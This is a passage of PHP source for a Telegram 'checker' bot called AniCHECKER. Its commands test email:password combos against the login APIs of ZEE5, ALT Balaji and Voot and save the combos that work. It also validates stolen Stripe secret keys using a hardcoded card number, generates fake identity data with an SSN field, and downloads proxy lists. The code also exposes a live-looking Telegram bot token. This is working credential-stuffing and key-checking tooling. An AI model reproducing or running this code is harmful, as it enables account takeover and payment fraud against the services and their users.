elseif (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////===========[Login Check]============/////////////////////

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

/////////////////===============[Result]===========///////////////////

if($token){
    fwrite(fopen('ani_zee5_storage.txt', 'a'), $combo.""."\r\n");
sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>✅Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}else{
sendMessage($chatId, "<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>❌Wrong Email or Password</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
};
curl_close($ch);
ob_flush();
}








///////////////// ALT BALAJI TEST ////////////////////////////////////////////
elseif (strpos($message, "/altb") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$mail = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
# --------------- [1st Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.cloud.altbalaji.com/accounts/lookup?login='.$mail.'&domain=IN&timestamp=1610612178656');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.cloud.altbalaji.com',
'method: POST',
'path: /accounts/lookup?login='.$mail.'&domain=IN&timestamp=1610612178656',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'accept-encoding: gzip, deflate, br',
'content-type: application/json;charset=UTF-8',
'origin: https://www.altbalaji.com',
'referer: https://www.altbalaji.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'login='.$mail.'&domain=IN&timestamp=1610612178656');

$result = curl_exec($ch);



# --------------- [2nd Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.cloud.altbalaji.com/accounts/login?domain=IN');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.cloud.altbalaji.com',
'method: POST',
'path: /accounts/login?domain=IN',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'content-type: application/json; charset=utf-8',
'origin: https://www.altbalaji.com',
'referer: https://www.altbalaji.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
'x-requested-with: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"'.$mail.'","password":"'.$pass.'"}');

$result1 = curl_exec($ch);

////////////////////////////===[Account Responses]

if (strpos($result1, 'ok')) {
  sendMessage($chatId, "<b>ALT BALAJI Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>✅Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

elseif (strpos($result1, '404')) {
  sendMessage($chatId, "<b>ALT BALAJI Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>INCORRECT CREDENTIALS :(</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

else {
  sendMessage($chatId, "<b>ALT BALAJI Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>PLEASE TRY AGAIN</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}
curl_close($ch);
ob_flush();
}




//////////////////////////////////////////// DATA GEN ///////////////////////////////////////////


elseif (strpos($message, "/dat") === 0){


$get = json_decode(file_get_contents('https://randomuser.me/api/1.2/?nat=us'),true);

$first = $get['results'][0]['name']['first'];
$last =  $get['results'][0]['name']['last'];
$gend =  $get['results'][0]['gender'];
$street = $get['results'][0]['location']['street'];
$city = $get['results'][0]['location']['city'];
$state = $get['results'][0]['location']['state'];
$email = $get['results'][0]['email'];
$dob = $get['results'][0]['dob']['date'];
$age = $get['results'][0]['dob']['age'];
$cell = $get['results'][0]['cell'];
$phone = $get['results'][0]['phone'];
$ssn = $get['results'][0]['id']['value'];


sendMessage($chatId, "<b>🌐 Generated Data 🌐</b>%0A<b>FIRST NAME</b>: <code>$first</code> <code>$last</code>%0A<b>GENDER</b> : <code>$gend</code>%0A<b>STREET</b> : <code>$street</code>%0A<b>CITY</b> : <code>$city</code>%0A<b>STATE</b> : <code>$state</code>%0A<b>DATE OF BIRTH</b> : <code>$dob</code>%0A<b>AGE</b> : <code>$age</code>%0A<b>SSN</b> : <code>$ssn</code>%0A<b>CELL</b> : <code>$cell</code>%0A<b>PHONE</b> : <code>$phone</code>%0A<b>EMAIL</b> : <code>$email</code>%0A<b>Generated By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

///////////////////////// JOKE ///////////////////////

elseif (strpos($message, "/joke") === 0){


$jok = json_decode(file_get_contents('https://sv443.net/jokeapi/v2/joke/Any?type=single'),true);
$joke = $jok['joke'];
$catg = $jok['category'];


sendMessage($chatId, "$joke%0A%0A<b>Category</b>:- $catg%0A<b>Type /joke for more</b>", $message_id);
}





///////////////////////////////IBAN TEST /////////////////////////////////////////////////
if(strpos($message, "/iban") === 0){

$combo = substr($message, 6);
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

/////////////////////==========[1st CURL REQ]==========////////////////

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://bank.codes/iban/validate/'); 
curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'origin: https://bank.codes',
'referer: https://bank.codes/iban/validate/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'iban='.$combo.'');
$result2 = curl_exec($ch); 
$bicsource = trim(strip_tags(GetStr($result2,'<td>SWIFT Code</td><td colspan="2">','</td>'))); 
$BIC = trim(strip_tags(GetStr($bicsource,'<td colspan="2">','<')));


if(strpos($result2, 'is a valid IBAN.')){ //If Response Contains "is a Valid IBAN.", then Mark it as Valid
sendMessage($chatId, '<b>✅ LIVE IBAN</b>%0A%0A<u>🩸IBAN:</u><code> '.$combo.'</code>%0A%0A<u>🧬Algorithm:</u><code> Passed</code>%0A%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Aniruddh </b>', $message_id);
}

elseif(empty($combo)){ //If there is no IBAN provided.
sendMessage($chatId, '<b>PROVIDE A IBAN TO CHECK!</b>', $message_id);
}

elseif(strpos($result2, 'is an invalid IBAN.')){ //If Response Contains "is an Invalid IBAN.", then Mark it as Invalid
sendMessage($chatId, '<b>❌ INVALID IBAN</b>%0A%0A<u>🩸IBAN:</u> <code> '.$combo.'</code>%0A%0A<u>🧬Algorithm:</u> <code> Failed</code>%0A%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Aniruddh </b>', $message_id);
}

else{
sendMessage($chatId, '<b>'.$combo.' Is Invalid!</b>%0A%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Aniruddh </b>', $message_id);
}
curl_close($ch);
ob_flush();
}




/////////////////////////////// CURRENCY ////////////////////////////////

if(strpos($message, "/conv") === 0){

$combo = substr($message, 6);
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$fromvalue = multiexplode(array(" "), $combo)[0];
$from = multiexplode(array(" "), $combo)[1];
$to = multiexplode(array(" "), $combo)[2];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}


$get20 = file_get_contents('https://www.alphavantage.co/query?function=CURRENCY_EXCHANGE_RATE&from_currency='.$from.'&to_currency='.$to.'&apikey=-xyz');
$value = trim(strip_tags(GetStr($get20,' Exchange Rate": "','"'))); 

$ratev2 = $fromvalue*$value;
$roundrate = explode('.', $ratev2);


if(strpos($get20, 'Invalid API call')){ 
sendMessage($chatId, '<b>That is not a Valid Currency or it is an Invalid Syntax</b>%0A%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Aniruddh </b>', $message_id);
}

else{
sendMessage($chatId, '<b>🌐 Converted '.$from.' To '.$to.' '.$to2.'%0A🔹Price = '.$roundrate[0].' '.$to2.'%0A🌀 Converted By AniCHECKER</b>%0A%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Aniruddh </b>', $message_id);
}
curl_close($ch);
}



///////////////// VOOT TEST ////////////////////////////////////////////
elseif (strpos($message, "/voot") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$mail = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}



# --------------- [1st Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://userauth.voot.com/usersV3/v3/login');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: userauth.voot.com',
'method: POST',
'path: /usersV3/v3/login',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'accept-encoding: gzip, deflate, br',
'content-type: application/json;charset=UTF-8',
'origin: https://www.voot.com',
'referer: https://www.voot.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"type":"traditional","deviceId":"Windows NT 10.0","deviceBrand":"PC/MAC","data":{"email":"'.$mail.'","password":"'.$pass.'"}}');

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"accessToken":"','"')));



# --------------- [2nd Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://pxapi.voot.com/smsv4/int/ps/v1/voot/user/entitlement/status');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: pxapi.voot.com',
'method: POST',
'path: /smsv4/int/ps/v1/voot/user/entitlement/status',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'content-type: application/json; charset=utf-8',
'accesstoken: '.$token.'',
'origin: https://www.voot.com',
'referer: https://www.voot.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
'x-requested-with: XMLHttpRequest',
));

$result1 = curl_exec($ch);

////////////////////////////===[Account Responses]

if (strpos($result, 'data')) {
  sendMessage($chatId, "<b>VOOT Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>✅Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

elseif (strpos($result, 'That’s an incorrect password. Please try again.')) {
  sendMessage($chatId, "<b>VOOT Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>INCORRECT CREDENTIALS :(</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

else {
  sendMessage($chatId, "<b>VOOT Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>USER DOESNT EXIST/ PLEASE TRY AGAIN</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}


curl_close($ch);
ob_flush();
}



/////////////////////////                PROXY DOWNLOADER/////////////////////////////////

if (strpos($message, "/http") === 0){
            file_put_contents("fresh_http.txt", file_get_contents("https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=5000&country=all&ssl=all&anonymity=all"));
            $amount = file_get_contents("https://api.proxyscrape.com?request=amountproxies&proxytype=http&timeout=5000&country=all&ssl=all&anonymity=all");
            $last_updated = file_get_contents('https://api.proxyscrape.com?request=lastupdated&proxytype=http');
            $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1582698743:AAGTiK11zAtbwZN_rx1F7XdocHyY2ybisKE/sendDocument');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
      $post = array(
        'chat_id' => $chatId,
        'caption' => "*Proxy type:* `HTTPS`\n*Country:* `All`\n*Timeout:* `5000`\n*Total proxy count:* `$amount`\n*Last updated:* `$last_updated`\n*Last updated date:* `$date1`\n\n*Proxy uploaded by AniCHECKER *",
        'parse_mode' => "markdown",
        'reply_to_message_id'=> $message_id,
        'document' => new CURLFile(realpath('fresh_http.txt'))
        );
      curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

      curl_exec($ch);
          }


/////////////////////==========[SOCKS4]==========////////////////

if (strpos($message, "/socks4") === 0){
            file_put_contents("fresh_socks4.txt", file_get_contents("https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=5000&country=all"));
            $amount = file_get_contents("https://api.proxyscrape.com?request=amountproxies&proxytype=socks4&timeout=5000&country=all");
            $last_updated = file_get_contents('https://api.proxyscrape.com?request=lastupdated&proxytype=socks4');
            $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1582698743:AAGTiK11zAtbwZN_rx1F7XdocHyY2ybisKE/sendDocument');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
      $post = array(
        'chat_id' => $chatId,
        'caption' => "*Proxy type:* `SOCKS4`\n*Country:* `All`\n*Timeout:* `5000`\n*Total proxy count:* `$amount`\n*Last updated:* `$last_updated`\n*Last updated date:* `$date1`\n\n*Proxy uploaded by AniCHECKER *",
        'parse_mode' => "markdown",
        "reply_to_message_id"=> $message_id,
        'document' => new CURLFile(realpath('fresh_socks4.txt'))
        );
      curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

      curl_exec($ch);
          }


/////////////////////==========[SOCKS5]==========////////////////

if (strpos($message, "/socks5") === 0){
            file_put_contents("fresh_socks5.txt", file_get_contents("https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=5000&country=all"));
            $amount = file_get_contents("https://api.proxyscrape.com?request=amountproxies&proxytype=socks5&timeout=5000&country=all");
            $last_updated = file_get_contents('https://api.proxyscrape.com?request=lastupdated&proxytype=socks5');
            $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1582698743:AAGTiK11zAtbwZN_rx1F7XdocHyY2ybisKE/sendDocument');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
      $post = array(
        'chat_id' => $chatId,
        'caption' => "*Proxy type:* `SOCKS5`\n*Country:* `All`\n*Timeout:* `5000`\n*Total proxy count:* `$amount`\n*Last updated:* `$last_updated`\n*Last updated date:* `$date1`\n\n*Proxy uploaded by AniCHECKER *",
        'parse_mode' => "markdown",
        "reply_to_message_id"=> $message_id,
        'document' => new CURLFile(realpath('fresh_socks5.txt'))
        );
      curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

      curl_exec($ch);
          }


//////////=========[Sk Key Check Command]=========//////////

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<b>KEY:</b> <code>$sec</code>%0A<b>REASON:</b> EXPIRED KEY%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<b>KEY:</b> <code>$sec</code>%0A<b>REASON:</b> INVALID KEY%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<b>KEY:</b> <code>$sec</code>%0A<b>REASON:</b> Testmode Charges Only%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}else{
    fwrite(fopen('ani_sk_live_storage.txt', 'a'), $sec.""."\r\n");
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<b>KEY:</b> <code>$sec</code>%0A<b>RESPONSE:</b> SK LIVE!!%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};

////////////////=============[Aniruddh]===============////////////////
////////==========[Used api raw bot of @Zeltraxrockzzz]============////////

?>